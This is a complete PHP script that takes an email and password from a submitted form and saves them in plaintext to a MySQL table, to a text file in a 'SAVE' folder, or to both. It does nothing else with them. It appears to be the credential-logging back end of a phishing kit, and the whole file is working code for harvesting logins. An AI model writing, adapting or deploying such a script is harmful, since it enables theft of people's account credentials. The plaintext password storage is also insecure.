<?php
if(!isset($_POST['email']) || !isset($_POST['password'])) return;
if(mb_strlen($_POST['email']) > 100 || mb_strlen($_POST['password']) > 100) return;

require('settings.php');

function goDB() {
	try {
		$dsn = sprintf('mysql:host=%s;dbname=%s;charset=%s', MYSQL_HOST, MYSQL_DBNAME, MYSQL_CHARSET);

		$opt = array(
			PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
		);

		$db = new PDO($dsn, MYSQL_USER, MYSQL_PASS, $opt);
	} catch(Exception $e) {
		return;
	}

	$sql = 'INSERT INTO `accounts` (`email`, `password`) VALUES (?, ?)';

	$res = $db -> prepare($sql);
	return $res -> execute(
		array(
			$_POST['email'],
			$_POST['password']
		)
	);
}

function goFile() {
	$file = sprintf('../SAVE/%s',
		TITLE_FILE_ACCOUNTS);

	$current = file_get_contents($file);
	$current .= sprintf("%s%s%s\n",
		$_POST['email'], SPLIT_SYMBOL, $_POST['password']);

	file_put_contents($file, $current);
}

if(RECORD_MODE == 'mysql') {
	goDB();
} else if(RECORD_MODE == 'file') {
	goFile();
} else {
	goDB();
	goFile();
}
?>